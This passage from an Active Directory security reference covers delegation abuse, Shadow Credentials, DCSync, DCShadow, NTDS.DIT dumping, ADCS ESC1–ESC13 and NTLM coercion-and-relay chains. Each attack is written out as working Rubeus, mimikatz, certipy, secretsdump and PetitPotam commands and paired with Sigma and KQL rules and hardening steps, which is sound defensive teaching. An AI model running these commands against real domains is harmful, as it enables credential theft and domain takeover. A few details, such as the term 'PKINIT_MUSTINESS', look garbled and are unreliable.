# Rubeus captures the DC's TGT → use it for DCSync
Rubeus.exe ptt /ticket:<base64_tgt>
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
```

### 5.4 Constrained delegation (S4U)

**Mechanism.** Constrained delegation (`msDS-AllowedToDelegateTo`) restricts which services the server can impersonate users to. The S4U2Proxy step succeeds only for SPNs listed in `msDS-AllowedToDelegateTo`. However, the service name portion of the SPN is not validated by the KDC — changing `cifs/target` to `ldap/target` in the requested SPN still works if the ticket is for the same host.

```
# Enumerate constrained delegation
Get-DomainComputer -TrustedToAuth -Properties samaccountname,msDS-AllowedToDelegateTo
Get-DomainUser -TrustedToAuth -Properties samaccountname,msDS-AllowedToDelegateTo

# Exploit: S4U with service name alteration
Rubeus.exe s4u /user:svc_constrained$ /rc4:NTHASH \
  /impersonateuser:Administrator /msdsspn:cifs/target.domain.local \
  /altservice:ldap /ptt
```

**Detection (all delegation types).**

| Source | Signal | Details |
|--------|--------|---------|
| Security log (DC) | Event ID 4769 | TGS with delegation flag set, `TransitedServices` field populated |
| LDAP audit | Attribute modification | `msDS-AllowedToActOnBehalfOfOtherIdentity`, `msDS-AllowedToDelegateTo`, `userAccountControl` (delegation bits) |
| BloodHound | Delegation edges | `AllowedToDelegate`, `AllowedToAct` relationships |

Sigma rule (RBCD modification):
```yaml
title: RBCD Attribute Modified on Computer Object
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: msDS-AllowedToActOnBehalfOfOtherIdentity
  condition: selection
level: critical
```

**Hardening.**

1. Set `ms-DS-MachineAccountQuota` to 0.
2. Remove unconstrained delegation from all hosts except Domain Controllers (where it's required). Use constrained delegation or RBCD with minimal scope instead:
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```
3. Add privileged accounts to the Protected Users group (they cannot be delegated).
4. Flag the `Account is sensitive and cannot be delegated` option on high-value accounts.
5. Monitor `msDS-AllowedToActOnBehalfOfOtherIdentity` changes — any modification is operationally rare and should trigger an alert.

---

## 6. Shadow Credentials

**Mechanism.** Windows Hello for Business and certificate-based authentication use the `msDS-KeyCredentialLink` attribute on AD objects. This attribute stores public keys that can be used for PKINIT (Kerberos authentication with certificates). An attacker with `GenericWrite` on a target can write a new key to `msDS-KeyCredentialLink`, then authenticate as the target using PKINIT with the corresponding private key — without knowing or changing the target's password.

The attack generates a self-signed certificate, writes the public key to the target's `msDS-KeyCredentialLink`, then uses the certificate for PKINIT to obtain a TGT as the target. The TGT's PAC contains the target's NTLM hash (via `PKINIT_MUSTINESS` / U2U), enabling Pass-the-Hash.

**Prerequisites.** Domain functional level 2016+ (for Key Trust). At least one DC running Windows Server 2016+ (for PKINIT with key trust). `GenericWrite`, `GenericAll`, `WriteProperty` on `msDS-KeyCredentialLink`, or `WriteDacl`/`WriteOwner` (to grant write access first).

**Exploitation.**

```
# Whisker (C# — from domain-joined Windows host)
Whisker.exe add /target:targetuser /domain:domain.local /dc:dc01.domain.local

# Output includes a Rubeus command with the generated certificate:
Rubeus.exe asktgt /user:targetuser /certificate:<base64_cert> /password:<cert_password> /getcredentials /show

# pyWhisker (Python — from Linux)
python3 pywhisker.py -d domain.local -u attacker -p Password1 \
  --target targetuser --action add --dc-ip 10.0.0.1

# Then authenticate via PKINIT
python3 gettgtpkinit.py domain.local/targetuser -cert-pfx cert.pfx \
  -pfx-pass password targetuser.ccache

# Extract NTLM hash from the TGT via U2U
python3 getnthash.py domain.local/targetuser -key <as-rep-key>
```

**Cleanup.** Remove the added key:
```
Whisker.exe remove /target:targetuser /deviceid:<device-guid> /domain:domain.local

# pyWhisker
python3 pywhisker.py -d domain.local -u attacker -p Password1 \
  --target targetuser --action remove --device-id <guid>
```

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| Security log (DC) | Event ID 5136 | `msDS-KeyCredentialLink` attribute modified |
| Security log (DC) | Event ID 4768 | PKINIT authentication (`PreAuthType: 16` or `PreAuthType: 17`) for a user that doesn't normally use certificate auth |

Sigma rule:
```yaml
title: Shadow Credentials — KeyCredentialLink Modified
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: msDS-KeyCredentialLink
  condition: selection
level: critical
```

KQL:
```kql
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName == "msDS-KeyCredentialLink"
| project TimeGenerated, SubjectUserName, ObjectDN, OperationType
```

**Hardening.**

1. Audit `msDS-KeyCredentialLink` on all user and computer objects. In environments not using Windows Hello for Business or key trust, this attribute should be empty.
2. Restrict write access to `msDS-KeyCredentialLink` to dedicated Key Admins only.
3. Regularly enumerate key credential links:
```powershell
Get-ADUser -Filter {msDS-KeyCredentialLink -like "*"} -Properties msDS-KeyCredentialLink |
  Select-Object Name, msDS-KeyCredentialLink
```
4. Alert on PKINIT authentications for accounts that don't have certificates enrolled in ADCS.

---

## 7. DCSync and DCShadow

### 7.1 DCSync

**Mechanism.** Domain Controllers replicate the AD database via the Directory Replication Service Remote Protocol (DRSUAPI). A principal with `DS-Replication-Get-Changes` (GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) and `DS-Replication-Get-Changes-All` (GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) on the domain root can call `DRSGetNCChanges` to request replication of any object's secrets — including NTLM hashes, Kerberos keys, and supplemental credentials for any account.

By default, Domain Admins, Enterprise Admins, Domain Controllers, and Administrators have these rights. An attacker who gains these rights (via ACL abuse — §4, or by compromising a DA account) can replicate every secret in the domain from any domain-joined machine — no need to log into a DC.

**Exploitation.**

```
# Mimikatz
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Impacket
impacket-secretsdump domain.local/dauser:Password1@dc01.domain.local -just-dc
impacket-secretsdump domain.local/dauser:Password1@dc01.domain.local -just-dc-user krbtgt

# Netexec
nxc smb dc01.domain.local -u dauser -p Password1 --ntds
```

Key targets for DCSync:
- `krbtgt` — enables Golden Ticket creation
- All Domain Admin accounts
- Machine accounts for DCs — enables Silver Tickets to DCs
- `AZUREADSSOACC$` — if Azure AD Connect is deployed, this account's key enables forging Azure AD Kerberos tickets

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| Security log (DC) | Event ID 4662 | Access rights include replication GUIDs, `SubjectUserName` is not a DC machine account |
| Network | DRSUAPI traffic | `DRSGetNCChanges` RPC from a non-DC IP |
| Security log (DC) | Event ID 4624 (Logon Type 3) | Logon from non-DC host using an account with replication rights |

Sigma rule:
```yaml
title: DCSync Attack — Replication from Non-DC Source
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
  filter_dc_accounts:
    SubjectUserName|endswith: '$'
    SubjectUserName|contains:
      - 'DC01'
      - 'DC02'
  condition: selection and not filter_dc_accounts
level: critical
```

KQL:
```kql
SecurityEvent
| where EventID == 4662
| where Properties contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    or Properties contains "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
| where SubjectUserName !endswith "$"
    or (SubjectUserName endswith "$" and SubjectUserName !in ("DC01$", "DC02$"))
| project TimeGenerated, SubjectUserName, SubjectDomainName, ObjectName, Properties
```

**Hardening.**

1. Restrict replication rights to DC machine accounts only. Remove explicit replication rights from user accounts:
```powershell
# Audit who has replication rights
(Get-Acl "AD:\DC=domain,DC=local").Access |
  Where-Object { $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' } |
  Select-Object IdentityReference, AccessControlType
```

2. Alert on any 4662 event with replication GUIDs from non-DC accounts.
3. Network segmentation: restrict DRSUAPI traffic (RPC endpoint) to DC-to-DC communication only.
4. Use Credential Guard on DCs (prevents memory-based credential theft, though DCSync itself works at the protocol level).

### 7.2 DCShadow

**Mechanism.** DCShadow temporarily registers a rogue Domain Controller by creating the required AD objects (`nTDSDSA`, `server` in the Sites container), pushes malicious replication data (SID history, ACL changes, attribute modifications) to legitimate DCs, then unregisters. Because the changes arrive via normal replication, they bypass most audit logging (the replication events are not logged as user-initiated changes) and propagate to all DCs.

**Requirements.** Domain Admin or Enterprise Admin (to create the nTDSDSA objects). The attacker needs two Mimikatz instances: one running as SYSTEM (to register the rogue DC and push replication) and one running as DA (to trigger replication).

```
# Terminal 1 (SYSTEM context) — register rogue DC and set attribute
mimikatz # lsadump::dcshadow /object:targetuser /attribute:sidHistory \
  /value:S-1-5-21-...-512

# Terminal 2 (DA context) — force replication
mimikatz # lsadump::dcshadow /push
```

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| AD replication metadata | New `nTDSDSA` objects | Any nTDSDSA creation outside planned DC promotions is suspicious |
| Network | DRS replication | Replication traffic from a non-DC IP |
| Security log (DC) | Event ID 4742 | Computer account modified (DC registration creates/modifies server objects) |
| Replication monitoring | Unexpected replication partner | `repadmin /showrepl` showing unknown partners |

**Hardening.** Same as DCSync: restrict replication rights, monitor nTDSDSA creation, restrict RPC/DRSUAPI traffic to DCs only. DCShadow requires DA-level access, so the primary defense is preventing DA compromise in the first place.

---

## 8. NTDS.DIT extraction

**Mechanism.** `ntds.dit` is the AD database file (`C:\Windows\NTDS\ntds.dit` on DCs), stored in the Extensible Storage Engine (ESE / JET Blue) format. It contains all AD objects, including encrypted password hashes and Kerberos keys. The encryption key (the PEK — Password Encryption Key) is derived from the SYSKEY (Boot Key), stored in the SYSTEM registry hive. Extracting and decrypting `ntds.dit` offline yields all domain credentials.

**Extraction methods.**

```
# Method 1: VSS shadow copy (requires admin on DC)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
vssadmin delete shadows /shadow={shadow-id} /quiet

# Method 2: diskshadow (scriptable, less monitored than vssadmin)
# Create diskshadow script:
# set context persistent nowriters
# add volume c: alias temp
# create
# expose %temp% z:
# exec "cmd" /c copy z:\windows\ntds\ntds.dit c:\temp\ntds.dit
# exec "cmd" /c copy z:\windows\system32\config\SYSTEM c:\temp\SYSTEM
# delete shadows volume %temp%
# reset
diskshadow /s script.txt

# Method 3: ntdsutil (IFM — Install From Media)
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ifm" quit quit
# Creates C:\temp\ifm\Active Directory\ntds.dit and C:\temp\ifm\registry\SYSTEM

# Method 4: DCSync (no DC access needed — see §7.1)
impacket-secretsdump domain.local/dauser:Password1@dc01.domain.local -just-dc

# Method 5: wmic/CIM shadow copy
wmic shadowcopy call create Volume='C:\'
```

**Offline parsing.**
```
# Impacket secretsdump — offline mode
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# DSInternals
$key = Get-BootKey -SystemHiveFilePath .\SYSTEM
Get-ADDBAccount -All -DBPath .\ntds.dit -BootKey $key |
  Format-Custom -View HashcatNT | Out-File hashes.txt
```

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| Security log (DC) | Event ID 4688 | Process creation: `vssadmin.exe`, `diskshadow.exe`, `ntdsutil.exe`, `wmic.exe` with shadow-copy arguments |
| Sysmon (DC) | Event ID 1 | Same process creation with full command line |
| File monitoring | File access | Read access to `C:\Windows\NTDS\ntds.dit` by non-NTDS processes |
| SACL audit | File audit | SACL on `ntds.dit` triggers Event ID 4663 on read access |

Sigma rule:
```yaml
title: NTDS.DIT Extraction via Shadow Copy
logsource:
  product: windows
  service: security
detection:
  selection_vssadmin:
    EventID: 4688
    NewProcessName|endswith: '\vssadmin.exe'
    CommandLine|contains: 'shadow'
  selection_ntdsutil:
    EventID: 4688
    NewProcessName|endswith: '\ntdsutil.exe'
    CommandLine|contains: 'ifm'
  selection_diskshadow:
    EventID: 4688
    NewProcessName|endswith: '\diskshadow.exe'
  condition: selection_vssadmin or selection_ntdsutil or selection_diskshadow
level: critical
```

**Hardening.** Restrict local admin on DCs to absolute minimum. Enable command-line logging (`ProcessCreationIncludeCmdLine_Enabled`). Set SACLs on `ntds.dit`. Monitor for VSS/diskshadow/ntdsutil execution. DCs should be Tier 0 — no non-DC admin should ever log into a DC interactively.

---

## 9. ADCS attacks

Active Directory Certificate Services (ADCS) is the Microsoft PKI implementation. Certificate templates, enrollment permissions, and CA configurations create numerous privilege escalation paths. The research by SpecterOps (2021, "Certified Pre-Owned") catalogued these as ESC1–ESC8, with additional ESC9–ESC13 identified subsequently.

### 9.1 ESC1 — Misconfigured certificate template with SAN

**Mechanism.** A certificate template with all of these conditions is vulnerable:
1. `ENROLLEE_SUPPLIES_SUBJECT` flag set (the enrollee can specify the Subject Alternative Name)
2. The template has an EKU (Extended Key Usage) that enables authentication (Client Authentication `1.3.6.1.5.5.7.3.2`, PKINIT Client Authentication `1.3.6.1.5.2.3.4`, Smart Card Logon `1.3.6.1.4.1.311.20.2.2`, Any Purpose `2.5.29.37.0`, or no EKU / SubCA)
3. Manager approval is not required
4. No authorized signatures required
5. A low-privilege principal has enrollment rights

The attacker enrolls a certificate specifying `administrator@domain.local` as the SAN, then authenticates via PKINIT as the administrator.

**Enumeration.**
```
# Certify
Certify.exe find /vulnerable

# Certipy (Python)
certipy find -u user@domain.local -p Password1 -dc-ip 10.0.0.1 -vulnerable

# Output shows vulnerable templates with [!] markers
```

**Exploitation.**
```
# Certipy — request certificate with admin SAN
certipy req -u user@domain.local -p Password1 -ca YOURCA \
  -template VulnTemplate -upn administrator@domain.local -dc-ip 10.0.0.1

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# Output: NTLM hash of administrator → PtH
```

### 9.2 ESC2 — Any Purpose or SubCA EKU

Template with `Any Purpose` EKU or SubCA EKU — the certificate can be used for any purpose including authentication. Same enrollment conditions as ESC1 minus the SAN requirement (though SAN may also be available). A SubCA certificate can sign other certificates, effectively creating an alternative CA.

### 9.3 ESC3 — Certificate request agent

A template allowing enrollment of Certificate Request Agent certificates (EKU `1.3.6.1.4.1.311.20.2.1`). The attacker obtains an enrollment agent certificate, then uses it to enroll certificates on behalf of other users using a second template that allows enrollment agents and has authentication EKU.

```
# Step 1: Get enrollment agent cert
certipy req -u user@domain.local -p Password1 -ca YOURCA \
  -template VulnAgentTemplate

# Step 2: Use agent cert to enroll on behalf of admin
certipy req -u user@domain.local -p Password1 -ca YOURCA \
  -template UserTemplate -on-behalf-of 'domain\administrator' \
  -pfx agent.pfx
```

### 9.4 ESC4 — Write access to certificate templates

An attacker with `WriteDacl`, `WriteOwner`, `WriteProperty`, or `GenericAll` on a certificate template object can modify the template to enable ESC1 (set `ENROLLEE_SUPPLIES_SUBJECT`, add authentication EKU, grant enrollment rights).

```
# Certipy — modify template to be ESC1-vulnerable, exploit, restore
certipy template -u user@domain.local -p Password1 -template TargetTemplate \
  -save-old -dc-ip 10.0.0.1
# (Certipy modifies the template)
certipy req -u user@domain.local -p Password1 -ca YOURCA \
  -template TargetTemplate -upn administrator@domain.local
certipy template -u user@domain.local -p Password1 -template TargetTemplate \
  -configuration old_config.json -dc-ip 10.0.0.1
```

### 9.5 ESC5–ESC7 — CA object ACL abuse

**ESC5:** Write access to the CA server's AD computer object or the PKI containers in AD. **ESC6:** `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on the CA — allows any enrollee to specify a SAN in any certificate request (regardless of template settings). Enabled via: `certutil -config "CA\CA" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2`. **ESC7:** `ManageCA` and `ManageCertificates` access on the CA — the attacker can approve pending requests, enable ESC6 flag, or modify template mappings.

```
# ESC7: Attacker with ManageCA adds themselves as officer, enables SubCA template
certipy ca -u user@domain.local -p Password1 -ca YOURCA -add-officer user
certipy ca -u user@domain.local -p Password1 -ca YOURCA \
  -enable-template SubCA
certipy req -u user@domain.local -p Password1 -ca YOURCA \
  -template SubCA -upn administrator@domain.local
# If request is pending, approve it:
certipy ca -u user@domain.local -p Password1 -ca YOURCA \
  -issue-request <request-id>
```

### 9.6 ESC8 — NTLM relay to ADCS web enrollment

**Mechanism.** ADCS web enrollment endpoints (`/certsrv/`) accept NTLM authentication. If EPA (Extended Protection for Authentication) is not enabled, an attacker can relay NTLM authentication from a coerced target (e.g., a DC via PetitPotam) to the ADCS web enrollment endpoint, enrolling a certificate as the relayed principal.

**Full attack chain: PetitPotam → ADCS relay → Domain compromise.**

```
# Step 1: Start ntlmrelayx targeting ADCS web enrollment
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Step 2: Coerce DC authentication
python3 PetitPotam.py ATTACKER_IP dc01.domain.local

# ntlmrelayx captures the DC cert → output: base64 certificate

# Step 3: Authenticate with the DC certificate
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1

# Step 4: DCSync with the DC's credentials
impacket-secretsdump domain.local/DC01\$@dc01.domain.local -k -no-pass
```

### 9.7 ESC9–ESC13

**ESC9:** `CT_FLAG_NO_SECURITY_EXTENSION` on template — the certificate doesn't include the `szOID_NTDS_CA_SECURITY_EXT` extension, bypassing `StrongCertificateBindingEnforcement`. Combined with `GenericWrite` on a target, the attacker modifies the target's UPN to match the admin, enrolls a cert, resets the UPN, and authenticates as admin.

**ESC10:** Weak certificate mapping (`CertificateMappingMethods` includes `0x4` UPN mapping) — similar to ESC9 but exploiting the mapping method rather than the security extension.

**ESC11:** NTLM relay to the CA's ICertPassage (RPC-based enrollment, `certipy relay` variant via RPC instead of HTTP).

**ESC12:** Shell access to the CA server allows extracting the CA private key (especially if stored in a software KSP rather than an HSM). With the CA key, the attacker forges any certificate.

**ESC13:** Issuance policy linked to a group — a certificate template linked to an OID that maps to an AD group via `msDS-OIDToGroupLink`. Enrolling a certificate with this policy grants the group's SID in the PAC.

**Detection (all ADCS attacks).**

| Source | Signal | Details |
|--------|--------|---------|
| Security log (CA) | Event ID 4887 | Certificate enrolled — check template name, requester, SAN |
| Security log (CA) | Event ID 4886 | Certificate request received |
| Security log (DC) | Event ID 4768 | PKINIT authentication (`PreAuthType: 16/17`) — unexpected for users without smartcards |
| ADCS audit | Template enumeration | Templates with `ENROLLEE_SUPPLIES_SUBJECT` + authentication EKU + low-privilege enrollment = ESC1 |
| Network | HTTP to `/certsrv/` | NTLM authentication to the ADCS web enrollment endpoint from unexpected sources |

Sigma rule:
```yaml
title: ADCS Certificate Enrollment with Subject Alternative Name
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4887
  keywords:
    - 'san:'
    - 'Subject Alternative Name'
  condition: selection and keywords
level: high
```

**Hardening.**

1. Remove `ENROLLEE_SUPPLIES_SUBJECT` from all templates unless strictly required.
2. Require Manager Approval on sensitive templates.
3. Disable unnecessary templates: `certutil -config "CA\CA" -setcatemplates -TemplateName`.
4. Remove the ADCS web enrollment endpoint entirely if not needed. If needed, enable EPA:
```
# IIS → Sites → Default Web Site → CertSrv → Authentication → Windows Authentication
# → Advanced Settings → Extended Protection: Require
```
5. Set `StrongCertificateBindingEnforcement = 2` (Full Enforcement) on DCs:
```
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement /t REG_DWORD /d 2 /f
```
6. Remove `EDITF_ATTRIBUTESUBJECTALTNAME2` from all CAs:
```
certutil -config "CA\CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
7. Audit enrollment permissions on all templates — use `Certify.exe find` or `certipy find` to enumerate.
8. Store CA private key in an HSM, not in the software KSP.

---

## 10. Authentication coercion

**Mechanism.** Several Windows RPC interfaces allow a remote caller to trigger the target machine to authenticate back to a specified UNC path. If the target is a DC and NTLM authentication is used, the attacker can relay the DC's NTLM response to a target service (ADCS, LDAP, SMB) to escalate privileges.

### 10.1 PetitPotam

**Protocol:** MS-EFSRPC (Encrypting File System Remote Protocol). The `EfsRpcOpenFileRaw` function (and related functions) accepts a UNC path and causes the server to authenticate to that path.

```
# Trigger (unauthenticated on unpatched DCs, authenticated on patched)
python3 PetitPotam.py ATTACKER_IP TARGET_DC
python3 PetitPotam.py -u user -p pass -d domain.local ATTACKER_IP TARGET_DC
```

Patched in multiple rounds (CVE-2021-36942 and subsequent updates) but the authenticated variant still works on patched systems.

### 10.2 PrinterBug (SpoolSample)

**Protocol:** MS-RPRN (Print System Remote Protocol). `RpcRemoteFindFirstPrinterChangeNotificationEx` causes the target to authenticate to the attacker's host. Requires the Print Spooler service to be running (which it is by default on most Windows servers, including DCs).

```
SpoolSample.exe TARGET_DC ATTACKER_HOST
python3 printerbug.py domain.local/user:pass@TARGET_DC ATTACKER_HOST
```

### 10.3 DFSCoerce

**Protocol:** MS-DFSNM (DFS Namespace Management). `NetrDfsRemoveStdRoot` and related functions trigger authentication to the attacker's path.

```
python3 DFSCoerce.py -u user -p pass -d domain.local ATTACKER_HOST TARGET_DC
```

### 10.4 ShadowCoerce

**Protocol:** MS-FSRVP (File Server Remote VSS Protocol). `IsPathShadowCopied` and related functions trigger authentication.

```
python3 ShadowCoerce.py -u user -p pass -d domain.local ATTACKER_HOST TARGET_DC
```

### 10.5 Other coercion vectors

`MS-EVEN` (Eventlog Remoting Protocol), `MS-EFSR` additional functions, WebDAV-triggered coercion (on hosts with the WebClient service running — forces HTTP-based NTLM, which is relayable without SMB signing).

### 10.6 Relay targets

| Relay Target | Result | Requirements |
|-------------|--------|-------------|
| ADCS web enrollment (ESC8) | Certificate as DC → DCSync | ADCS deployed, no EPA |
| LDAP (for RBCD) | Set RBCD on DC → impersonate DA | LDAP signing not required |
| LDAP (for Shadow Credentials) | Write KeyCredentialLink on DC | LDAP signing not required |
| SMB on target | Code execution | SMB signing not required (not default on DCs, so rare) |

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| Network | NTLM from DC to unexpected destination | DCs should not initiate NTLM auth to workstations |
| Security log (DC) | Event ID 4624 (Type 3) | DC machine account authenticating to non-DC hosts |
| Network | RPC calls | MS-EFSRPC, MS-RPRN, MS-DFSNM, MS-FSRVP calls to DCs from non-admin hosts |

**Hardening.**

1. Disable the Print Spooler on DCs:
```powershell
Stop-Service Spooler; Set-Service Spooler -StartupType Disabled
```

2. Enable EPA on all web endpoints (ADCS, Exchange, ADFS):
```
# For ADCS: IIS → Windows Authentication → Advanced Settings → Extended Protection: Require
```

3. Require LDAP signing and channel binding on DCs:
```
GPO: Computer Configuration → Policies → Windows Settings → Security Settings →
  Local Policies → Security Options →
  "Domain controller: LDAP server signing requirements" → Require signing

Registry:
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" \
  /v LdapEnforceChannelBinding /t REG_DWORD /d 2 /f
```

4. Disable NTLM where possible; at minimum, restrict outbound NTLM from DCs:
```
GPO: "Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers" → Deny all
```

5. Block the WebClient service on servers (prevents WebDAV-based coercion):
```powershell
Stop-Service WebClient; Set-Service WebClient -StartupType Disabled
```

6. Patch DCs for known coercion CVEs (PetitPotam, PrinterBug fixes).

7. Network segmentation: DCs should only communicate with other DCs, management workstations, and required services — not arbitrary workstations.

---

## 11. AD Detection Engineering

This section provides a consolidated detection framework for Active Directory attacks. Individual sections (§1–§10) include inline detection rules for their specific techniques; this section extends those with multi-event correlation chains, YARA signatures for common AD attack tooling, event log analysis patterns, and deception-based detection. Together they form a layered detection architecture.

> **Relation to Chapter 14B §7.** Chapter 14B covers detection engineering for Windows process-level attacks (LSASS access, token manipulation, Exchange exploitation). This section is exclusively AD protocol and directory-level detection. No duplication exists.

### 11.1 Sigma rules — AD attack correlation

The following rules complement the per-technique inline rules. They detect from different vantage points (multi-event chains, directory change auditing, network-layer indicators) or cover techniques that lack formal Sigma rules in §1–§10.

**Rule 1 — Kerberoasting burst detection (RC4 TGS-REQ volume anomaly).**

The inline rule in §1.2 detects individual RC4 TGS requests. This rule detects burst patterns: multiple RC4-encrypted TGS-REQ events for distinct SPNs from a single source within a short window — the behavioral signature of automated Kerberoasting tools.

```yaml
title: Kerberoasting — RC4 TGS-REQ Burst from Single Source
id: 7a3e2f1d-9c4b-4a8e-b5d7-2f1c6e3a9b4d
status: stable
description: >
    Detects a single source IP requesting multiple TGS tickets with RC4
    encryption (etype 0x17) for distinct service principal names within
    a 5-minute window. Automated Kerberoasting tools (Rubeus kerberoast,
    Impacket GetUserSPNs, Invoke-Kerberoast) produce this pattern.
    Threshold: ≥5 distinct SPNs with RC4 from the same source within 300s.
references:
    - https://attack.mitre.org/techniques/T1558/003/
    - §1.2 — Kerberoasting
author: Security Library
date: 2026/05/13
tags:
    - attack.credential_access
    - attack.t1558.003
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
        Status: '0x0'
    filter_machine_accounts:
        ServiceName|endswith: '$'
    filter_krbtgt:
        ServiceName: 'krbtgt'
    timeframe: 5m
    condition: selection and not filter_machine_accounts and not filter_krbtgt | count(ServiceName) by IpAddress > 4
level: high
falsepositives:
    - Monitoring tools that enumerate service tickets for health checks
    - Legacy applications that legitimately use RC4 for multiple services
```

**Rule 2 — AS-REP Roasting correlation (4738 + 4768 chain).**

Detects the weaponized AS-REP Roasting pattern: `DONT_REQ_PREAUTH` flag set on an account (4738), followed by an AS-REP without preauthentication (4768 with PreAuthType 0) for the same account within 10 minutes. This catches the targeted variant described in §1.1.

```yaml
title: Targeted AS-REP Roasting — UAC Toggle Followed by Preauth-less TGT
id: 8b4f3a2e-1d5c-4e7f-a6b8-3c2d7f4e5a1b
status: stable
description: >
    Correlates Event 4738 (userAccountControl change including bit 4194304)
    with Event 4768 (TGT request with PreAuthType 0) for the same user
    within 10 minutes. This chain indicates an attacker with write access
    toggling DONT_REQ_PREAUTH, roasting the account, then restoring the flag.
references:
    - https://attack.mitre.org/techniques/T1558/004/
    - §1.1 — Targeted AS-REP Roasting
author: Security Library
date: 2026/05/13
tags:
    - attack.credential_access
    - attack.t1558.004
logsource:
    product: windows
    service: security
detection:
    event_uac_change:
        EventID: 4738
        UserAccountControl|contains: '4194304'
    event_asrep:
        EventID: 4768
        PreAuthType: 0
    timeframe: 10m
    condition: event_uac_change | temporal_proximity(event_asrep, by=TargetUserName)
level: critical
falsepositives:
    - Legitimate administrative change to preauthentication settings
    - Service account provisioning scripts (should not set DONT_REQ_PREAUTH)
```

> **Implementation note.** The `temporal_proximity` pseudo-operator must be translated to platform-specific temporal correlation. In Splunk: `| transaction TargetUserName maxspan=10m`. In KQL: `join kind=inner` on `TargetUserName` with `TimeGenerated` delta ≤ 10m. In Elastic: EQL `sequence by TargetUserName with maxspan=10m`.

**Rule 3 — DCSync from non-DC (enhanced with source IP validation).**

The inline rule in §7.1 filters by `SubjectUserName` suffix. This enhanced version adds source IP validation against a known-DC allowlist and captures all three replication control access GUIDs.

```yaml
title: DCSync — Directory Replication from Non-DC Host (Enhanced)
id: 9c5f4b3a-2e6d-4f8a-b7c9-4d3e8f5a6b2c
status: stable
description: >
    Detects Event 4662 with any of the three replication control access rights
    (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All,
    DS-Replication-Get-Changes-In-Filtered-Set) where the source is not a
    known domain controller. Uses both account name and source IP filtering.
references:
    - https://attack.mitre.org/techniques/T1003/006/
    - §7.1 — DCSync
author: Security Library
date: 2026/05/13
tags:
    - attack.credential_access
    - attack.t1003.006
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        Properties|contains:
            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes
            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes-All
            - '89e95b76-444d-4c62-991a-0facbeda640c'  # DS-Replication-Get-Changes-In-Filtered-Set
    filter_known_dcs:
        SubjectUserName|endswith: '$'
        SubjectLogonId|contains:
            - 'DC01'
            - 'DC02'
            - 'DC03'
    condition: selection and not filter_known_dcs
level: critical
falsepositives:
    - Azure AD Connect synchronization account (MSOL_*)
    - Third-party SIEM agents with AD read access (should not have replication rights)
```

> **Deployment.** Replace the `filter_known_dcs` allowlist with actual DC hostnames and service accounts in your environment. The Azure AD Connect `MSOL_` account legitimately uses replication rights — whitelist its specific `SubjectUserName` if present.

**Rule 4 — DCShadow rogue DC registration.**

No formal Sigma rule exists in §7.2 for DCShadow. This rule detects the creation of `nTDSDSA` objects in the AD Sites container, which is the first step of the DCShadow attack — registering a rogue domain controller.

```yaml
title: DCShadow — Rogue Domain Controller Registration (nTDSDSA Creation)
id: ad6e5c4b-3f7d-4a9b-c8d0-5e4f9a6b7c3d
status: stable
description: >
    Detects creation of nTDSDSA objects in the Sites configuration container.
    DCShadow (§7.2) creates these objects to register a rogue DC before
    pushing malicious replication data. Legitimate nTDSDSA creation only
    occurs during planned DC promotions (dcpromo / Install-ADDSDomainController).
    Any nTDSDSA creation outside a change window is critical.
references:
    - https://attack.mitre.org/techniques/T1207/
    - §7.2 — DCShadow
author: Security Library
date: 2026/05/13
tags:
    - attack.defense_evasion
    - attack.t1207
logsource:
    product: windows
    service: security
detection:
    selection_create:
        EventID: 5137
        ObjectClass: 'nTDSDSA'
    selection_modify:
        EventID: 5136
        AttributeLDAPDisplayName: 'serverReference'
        ObjectClass: 'server'
        OperationType: '%%14674'  # Value Added
    condition: selection_create or selection_modify
level: critical
falsepositives:
    - Planned domain controller promotions (correlate with change management tickets)
```

